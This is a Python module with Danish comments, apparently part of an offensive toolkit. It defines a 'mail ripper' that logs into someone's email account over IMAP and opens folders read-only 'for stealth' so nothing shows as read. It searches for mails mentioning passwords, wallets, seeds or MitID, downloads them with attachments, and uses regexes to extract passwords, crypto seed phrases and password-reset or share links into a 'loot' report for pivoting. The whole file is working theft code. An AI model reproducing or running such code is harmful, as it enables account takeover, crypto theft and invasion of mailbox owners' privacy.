# -*- coding: utf-8 -*-
import os
import imaplib
import email
import json
import re
import time
from email.header import decode_header
from datetime import datetime
from pathlib import Path
from core.utils import C, session

class GoliathMailRipper:
    """Tømmer mailkontoen hurtigt, gemmer alt lokalt (inkl. attachments) og udtrækker secrets på farten."""
    def __init__(self, user, app_password):
        self.user = user.strip().lower()
        self.pwd = app_password.replace(" ", "")
        
        # NY V8 TILFØJELSE: Dynamisk IMAP detection
        self.host = self._detect_imap_host(self.user)
        
        # Sætter loot folder op
        base_dir = session.get("loot_folder", "./loot")
        self.save_dir = os.path.join(base_dir, f"18_MAILRIP_{self.user.split('@')[0]}")
        
        # NY V8 TILFØJELSE: JSON Datastruktur til Omni-Pivot kompatibilitet
        self.data = {
            "Konto": self.user,
            "IMAP_Server": self.host,
            "Mails_Ripped": 0,
            "Vedhæftninger_Downloadet": 0,
            "Ekstraherede_Secrets": [],
            "Krypto_Seeds": [],
            "High_Value_Links": [],
            "Timestamp": datetime.now().isoformat()
        }

    def _detect_imap_host(self, email_addr):
        """Finder automatisk den rigtige server baseret på domænet"""
        domain = email_addr.split('@')[-1]
        if "gmail.com" in domain: return "imap.gmail.com"
        elif "yahoo" in domain: return "imap.mail.yahoo.com"
        elif "icloud.com" in domain or "mac.com" in domain or "me.com" in domain: return "imap.mail.me.com"
        elif "protonmail" in domain: return "127.0.0.1" # Proton kræver lokal bridge
        else: return "imap-mail.outlook.com" # Fallback til dit originale (Outlook/Hotmail/Live)

    def run(self, driver=None): # Tilføjet driver for at matche Omni-Pivot standard
        print(f"\n{C.CYAN}{'='*60}\n[18] GOLIATH MAIL RIPPER (Smart Extraction V8)\n{'='*60}{C.RESET}")
        print(f"{C.YELLOW}[*] FORBINDER TIL {self.user} VIA {self.host}...{C.RESET}")
        
        os.makedirs(self.save_dir, exist_ok=True)
        
        try:
            mail = imaplib.IMAP4_SSL(self.host)
            mail.login(self.user, self.pwd)
            print(f"{C.GREEN}    ✓ IMAP Login Succesfuldt!{C.RESET}")
            
            status, folders = mail.list()
            if status == 'OK':
                for f in folders:
                    # Renser mappenavne uanset sprog og opsætning
                    f_name = f.decode().split(' "/" ')[-1].strip('"')
                    # Undgår ofte tomme system-mapper for at spare tid
                    if "All Mail" in f_name or "Important" in f_name or "Starred" in f_name:
                        pass # Vi ripper de fysiske mapper i stedet for de virtuelle for at undgå dubletter
                        
                    print(f"\n{C.YELLOW}[*] Ripper mappe: {f_name}{C.RESET}")
                    self._rip_folder_smart(mail, f_name)
                    
            mail.logout()
            print(f"\n{C.GREEN}[✓] RIP COMPLETE. Data gemt i: {self.save_dir}{C.RESET}")
            
            # Gemmer JSON rapport til brug i Sniper / Titan
            self.save()
            
        except Exception as e:
            if "BasicAuthBlocked" in str(e) or "AUTHENTICATIONFAILED" in str(e):
                print(f"{C.RED}[!] FEJL: Login afvist. Du SKAL bruge 'App Password' (2FA bypass) for {self.host}.{C.RESET}")
            else:
                print(f"{C.RED}[!] Systemfejl: {e}{C.RESET}")

    def _rip_folder_smart(self, mail, folder):
        try:
            status, _ = mail.select(f'"{folder}"', readonly=True) # Readonly for stealth (markerer dem ikke som læst)
            if status != 'OK': return
        except Exception:
            return # Springer over hvis mappen ikke kan åbnes (fx "[Gmail]")

        # NY V8 TILFØJELSE: Massiv og sikker søgematrix
        keywords = ["password", "kode", "lunar", "wallet", "seed", "krypto", "crypto", "login", "faktura", "invoice", "nemid", "mitid"]
        found_ids = set()
        
        import sys
        sys.stdout.write(f"{C.CYAN}    [*] Udfører Server-Side High-Value Keyword Search...{C.RESET}")
        sys.stdout.flush()
        
        # Vi søger pr. keyword for at undgå IMAP OR-syntaks fejl på forskellige servere
        for kw in keywords:
            status, messages = mail.search(None, f'BODY "{kw}"')
            if status == 'OK' and messages[0]:
                for num in messages[0].split():
                    found_ids.add(num)
                    
        sys.stdout.write("\r" + " " * 80 + "\r")
        
        if found_ids:
            print(f"{C.GREEN}    🔥 Fandt {len(found_ids)} høj-værdi mails i {folder}. Downloader...{C.RESET}")
            for num in found_ids:
                try:
                    _, data = mail.fetch(num, '(RFC822)')
                    msg = email.message_from_bytes(data[0][1])
                    self._save_content(msg, folder, num.decode())
                    self.data["Mails_Ripped"] += 1
                except Exception as e:
                    print(f"{C.DIM}      [-] Kunne ikke downloade mail ID {num.decode()}: {e}{C.RESET}")
        else:
            print(f"{C.DIM}    [-] Ingen high-value hits i denne mappe.{C.RESET}")

    def _save_content(self, msg, folder, mid):
        # Decode subject sikkert
        subject_header = msg.get("Subject", "Ingen_emne")
        decoded_header = decode_header(subject_header)[0]
        subject, encoding = decoded_header
        if isinstance(subject, bytes): 
            subject = subject.decode(encoding or "utf-8", errors="ignore")
        
        safe_subject = "".join([c for c in str(subject) if c.isalnum() or c in (' ', '_')]).rstrip()
        folder_path = os.path.join(self.save_dir, folder.replace("/", "_"))
        os.makedirs(folder_path, exist_ok=True)
        
        file_path = os.path.join(folder_path, f"{mid}_{safe_subject[:50]}.txt")
        
        full_text_content = ""
        
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(f"Fra: {msg.get('From')}\nEmne: {subject}\nDato: {msg.get('Date')}\n{'-'*50}\n")
            
            if msg.is_multipart():
                for part in msg.walk():
                    content_type = part.get_content_type()
                    content_disposition = str(part.get("Content-Disposition"))
                    
                    if content_type == "text/plain" and "attachment" not in content_disposition:
                        payload = part.get_payload(decode=True)
                        if payload:
                            text = payload.decode(errors="ignore")
                            f.write(text)
                            full_text_content += text + "\n"
                            
                    elif part.get_filename(): # Gemmer vedhæftede filer (PDF, billeder etc)
                        filename = part.get_filename()
                        safe_filename = "".join([c for c in filename if c.isalnum() or c in ('.', '_', '-')])
                        attach_dir = os.path.join(folder_path, "attachments")
                        os.makedirs(attach_dir, exist_ok=True)
                        
                        try:
                            with open(os.path.join(attach_dir, f"{mid}_{safe_filename}"), "wb") as af:
                                af.write(part.get_payload(decode=True))
                            self.data["Vedhæftninger_Downloadet"] += 1
                        except Exception: pass
            else:
                payload = msg.get_payload(decode=True)
                if payload:
                    text = payload.decode(errors="ignore")
                    f.write(text)
                    full_text_content += text

        # --- NY V8 TILFØJELSE: On-the-fly Regex Extraction ---
        if full_text_content:
            self._extract_secrets(full_text_content, subject)

    def _extract_secrets(self, text, source_subject):
        """NY V8: Analyserer den rippede tekst for adgangskoder og crypto-keys"""
        
        # Leder efter "kode", "password" efterfulgt af noget
        pwd_matches = re.findall(r'(?i)(?:password|kode|adgangskode|pass|pwd)[\s:=]+([^\s<>"\'/]{5,30})', text)
        for pwd in pwd_matches:
            if pwd.lower() not in ["forgot", "reset", "klik", "click", "her", "here"] and pwd not in self.data["Ekstraherede_Secrets"]:
                self.data["Ekstraherede_Secrets"].append(pwd)
                print(f"{C.MAGENTA}      ✓ Muligt kodeord udtrækket: {pwd[:3]}*** (Fra: {source_subject[:20]}){C.RESET}")

        # Leder efter 12/24 ords Crypto Mnemonic Seeds
        mnemonic = re.findall(r'\b(?:[a-z]{3,12}\s){11,23}[a-z]{3,12}\b', text.lower())
        for seed in mnemonic:
            if seed not in self.data["Krypto_Seeds"]:
                self.data["Krypto_Seeds"].append(seed)
                print(f"{C.RED}      🔥 KRYPTO SEED FUNDET I MAIL: {source_subject[:30]}{C.RESET}")

        # Leder efter Password-reset links eller cloud invites
        links = re.findall(r'https?://[^\s<>"\']+', text)
        for link in links:
            if any(x in link.lower() for x in ["reset", "token=", "invite", "share", "onedrive", "dropbox"]):
                if link not in self.data["High_Value_Links"]:
                    self.data["High_Value_Links"].append(link)

    def save(self):
        filename = os.path.join(self.save_dir, "18_MAILRIP_REPORT.json")
        
        if os.path.exists(filename):
            try: os.remove(filename)
            except: pass
            
        Path(filename).write_text(json.dumps(self.data, indent=4, ensure_ascii=False), encoding="utf-8")
        print(f"\n{C.GREEN}[✓] Intelligence Rapport gemt til pivotering: {filename}{C.RESET}")